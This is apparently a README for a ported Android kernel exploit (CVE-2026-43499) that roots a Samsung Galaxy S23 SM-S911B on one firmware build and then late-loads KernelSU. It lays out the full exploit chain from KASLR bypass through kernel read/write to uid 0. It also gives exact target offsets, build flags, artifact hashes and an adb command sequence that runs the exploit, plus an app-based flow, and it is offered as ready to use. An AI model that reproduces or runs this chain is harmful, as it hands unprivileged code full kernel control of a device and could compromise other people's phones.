# Galaxy S23 SM-S911B / S911BXXSAFZE1 port

Open-source port of the CVE-2026-43499 exploit and KernelSU late-load to the
Samsung Galaxy S23 (`SM-S911B`, codename `dm1q`) on firmware `S911BXXSAFZE1`.

## Status

**Device-tested and working end-to-end**, including root from the Root My
Galaxy APK through the Shizuku shell bridge.

Verified on real `SM-S911B` hardware:

- Full root chain from `adb shell` (`uid=2000` → `uid=0`).
- Full root chain from the Root My Galaxy app via Shizuku (`u:r:shell:s0`).
- KernelSU module loaded, `su` working, root granted to a real app.

The successful chain is:

```text
tracefs KASLR slide (canonical data mode)
-> controlled 32-object mm_struct slab
-> SKB head shaping
-> order-3 SKB reclaim
-> MCAST stale waiter write
-> fake ashmem fops
-> configfs arbitrary read/write
-> pipe physical read/write
-> workqueue usermode helper
-> uid 0 root daemon
-> KernelSU ksud --late-load
```

Root and KernelSU evidence:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
kernelsu 208896 0 - Live 0x0000000000000000 (OE)
```

## Exact target

| Field | Value |
| --- | --- |
| Model | `SM-S911B` Galaxy S23 |
| Device | `dm1q` |
| Firmware | `S911BXXSAFZE1` |
| Build display | `BP4A.251205.006.S911BXXSAFZE1` |
| Fingerprint | `samsung/dm1qxxx/qssi:16/BP4A.251205.006/S911BXXSAFZE1:user/release-keys` |
| Kernel | `5.15.189-android13-8-33413713-abS911BXXSAFZE1` |
| Payload profile | `dm1q-S911BXXSAFZE1` |
| Proven writer | MCAST (`SLIDE_STACK_WRITER=1`) |
| Proven execution domains | `uid=2000`, `u:r:shell:s0` (adb shell and Shizuku) |

The profile is exact-firmware bound. Do not use it on a nearby S911B build or
another S23 model without re-auditing offsets and CRCs.

## Build variant

The app payload is built with `-DAPP_PAYLOAD=1 -DSLIDE_STACK_WRITER=1`, which
selects the `tracefs-shaped-configfs-pipe-root` route (MCAST stack writer). The
target header (`src/targets/dm1q-S911BXXSAFZE1/target.h`) enables:

```c
#define APP_PHYS_P0_ORACLE 1
#define APP_TRACEFS_SLIDE 1
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
```

## Critical implementation notes

### Do not force the P0 offset

`SLIDE_P0_OFFSET` must **not** be set for this profile. The tracefs scan is the
only route that produces the canonical data mode the chain requires:

```text
slide-kaslr-ok source=tracefs ... data_mode=canonical   <- required
slide-kaslr-ok source=forced  ... data_mode=physical-alias  <- fails
```

Forcing a cached offset switches `data_addr_canonical` off, and the chain dies
at the fops slide with `cfi misc_fops mismatch` followed by
`pipe physrw done=0 root=0`. The APK therefore always scans via tracefs and
never injects `SLIDE_P0_OFFSET`.

### KernelSU needs `--allow-shell`

The root helper's guarded `--late-load` operation passes `--allow-shell` to the
`ksud` loader. Without it, the `sucompat` hook does not redirect `su` for the
shell (`uid 2000`), and `su -c id` reports `su: inaccessible or not found`.

## KernelSU handoff

The module is built from Samsung's released S916B opensource with the live FZG1
config and Android clang, with the Samsung KDP/RKP/DEFEX patch, live text
patching disabled, and the RKP syscall-table write hard-stopped. It was
re-targeted from the S916B FZG1 build to this S911B FZE1 device.

Static audit against the recovered exact FZE1 `vmlinux.elf`:

```text
undefined imports: 201
names present in target: 201
__versions size: 0
non-exported imports (kallsyms): 65
CRC mismatches: 0
```

The non-exported imports require the kallsyms-aware `ksud` loader. Plain
`insmod` is not supported. The documented path uses the root helper's guarded
`--late-load` so the loader runs in a private mount namespace and its
security-domain and stdio transition can complete safely.

The vermagic was patched in place (equal-length, 15 bytes):

```text
5.15.189-android13-8-33413713-abS916BXXSAFZG1
-> 5.15.189-android13-8-33413713-abS911BXXSAFZE1
```

Use the matched `.ko`/`ksud` pair. Do not mix with the KernelSU Next build or
an older loader.

## Artifacts

| File | Size | SHA-256 |
| --- | --- | --- |
| `cve-2026-43499-app.so` | 130528 | `594a1173899d504e9efa2c19d32983926623a2c2dcdf2b5ac6cef34ea1d6b3cf` |
| `cve-2026-43499-root` (helper, `libcve43499root.so`) | 25912 | `0762fc6ef84694ec4026292a5a618b8b40d2fbfc0ba9692e21ef4f66dc0e23b1` |
| `ksud-dm1q-S911BXXSAFZE1-kdp` | 4879560 | `07302e5a79cc6c57d23a06cbb996c2f31c50c29589c03cf40278cfe43ab92639` |
| `android13-5.15.189_kernelsu-dm1q-S911BXXSAFZE1.ko` | 356928 | `d99f00dc26241cffb4d7fa4e920a739d8e0b91869ae329f7166a9711be52923f` |

The `ksud` binary embeds the patched `.ko`; the standalone `.ko` is kept for
auditing.

## Build

```sh
export ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=dm1q-S911BXXSAFZE1
```

Outputs:

```text
build/dm1q-S911BXXSAFZE1/cve-2026-43499
build/dm1q-S911BXXSAFZE1/cve-2026-43499-app.so
build/dm1q-S911BXXSAFZE1/cve-2026-43499-root
```

## Manual ADB flow

```sh
adb push cve-2026-43499-app.so /data/local/tmp/dm1q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ksud-dm1q-S911BXXSAFZE1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp

adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 \
  EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm1q.so \
  /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm1q-fze1.log"

adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
adb shell "su -c id"
```

## APK / Shizuku flow

The Root My Galaxy app delegates the native runner through Shizuku so the
payload executes as `u:r:shell:s0` (the same domain as adb shell). This bridge
was previously unvalidated for this kernel family; it is now confirmed working
on `SM-S911B`.

1. Enable Developer options, USB debugging, and "Disable child process
   restrictions".
2. Install and start Shizuku (wireless debugging).
3. Grant Root My Galaxy permission in Shizuku.
4. Run the install from the app and watch for `slide-kaslr-ok`, then
   `pipe physrw ... done=1 root=1` and `KernelSU control verified`.
5. Install KernelSU Manager `v3.2.5` (package `me.weishu.kernelsu`) and grant
   root to apps.

## Caveats

- Root and KernelSU are volatile: a reboot clears them. Re-run the app or the
  manual flow after every boot.
- One exploit attempt per boot; wait for the boot allocator to settle (~1 min).
- KernelSU initialization flips SELinux back to `Enforcing`, which is expected.

## Authorship

This port was prepared with AI assistance, based on the `dm2q` (S916B) FZG1
port by `@johnny-salz` and the hardware evidence from `@manups4e`.
